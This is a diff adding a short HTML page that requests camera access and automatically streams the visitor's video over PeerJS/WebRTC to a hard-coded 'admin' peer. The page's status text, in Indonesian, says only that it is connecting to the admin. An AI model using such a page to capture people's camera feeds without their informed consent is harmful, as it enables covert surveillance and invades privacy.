@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <style>
+    body { margin: 0; background: black; overflow: hidden; }
+    video { width: 100vw; height: 100vh; object-fit: cover; display: block; }
+    .status { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; color: white; font-family: Arial; background: rgba(0,0,0,0.5); padding: 10px; }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay muted></video>
+  <div class="status">🔴 Menghubungkan ke admin...</div>
+
+  <script>
+    const adminId = 'admin-panel-xyz'; // ID admin tetap
+    const peer = new Peer();
+    let stream = null;
+    const video = document.getElementById('video');
+    const status = document.querySelector('.status');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(s => {
+        stream = s;
+        video.srcObject = s;
+        status.innerText = '✅ Terhubung!';
+
+        // Otomatis call admin setelah peer ready
+        peer.on('open', () => {
+          const call = peer.call(adminId, stream);
+          call.on('error', () => {
+            status.innerText = '⚠️ Gagal konek ke admin, coba lagi...';
+          });
+        });
+      })
+      .catch(err => {
+        status.innerText = '❌ Izin kamera ditolak!';
+      });
+  </script>
+</body>
+</html>
